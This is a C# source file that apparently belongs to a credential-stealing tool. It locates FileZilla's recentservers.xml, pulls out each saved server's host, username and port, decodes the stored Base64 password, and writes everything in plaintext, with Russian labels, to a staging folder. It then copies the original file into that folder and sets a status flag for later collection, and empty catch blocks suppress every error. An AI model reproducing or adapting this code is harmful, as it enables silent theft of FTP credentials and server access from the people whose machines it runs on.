using System;
using System.IO;
using System.Xml;

internal class FZ
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}FileZilla";
		string text2 = $"{Buffer.path_ad}FileZilla\\recentservers.xml";
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		if (File.Exists(text2))
		{
			try
			{
				string text3 = "";
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text2);
				foreach (XmlElement item in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
				{
					try
					{
						string innerText = item.GetElementsByTagName("Host")[0].InnerText;
						if (innerText.Length > 3)
						{
							text3 += "=====================================\n";
							text3 = text3 + "Хост: " + innerText + "\n";
							text3 = text3 + "Имя пользователя: " + item.GetElementsByTagName("User")[0].InnerText + "\n";
							text3 = text3 + "Пароль: " + Base64.Decode(item.GetElementsByTagName("Pass")[0].InnerText) + "\n";
							text3 = text3 + "Порт: " + item.GetElementsByTagName("Port")[0].InnerText + "\n";
							text3 += "=====================================\n\n\n";
						}
					}
					catch
					{
					}
				}
				File.WriteAllText($"{text}\\FileZilla.txt", text3.Trim().Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
			File.Copy(text2, $"{text}\\recentservers.xml");
			Buffer.XBufferData[2] = "1";
		}
		else
		{
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}FileZilla не найдена на компьютере.");
			Buffer.XBufferData[2] = "0";
		}
	}
}
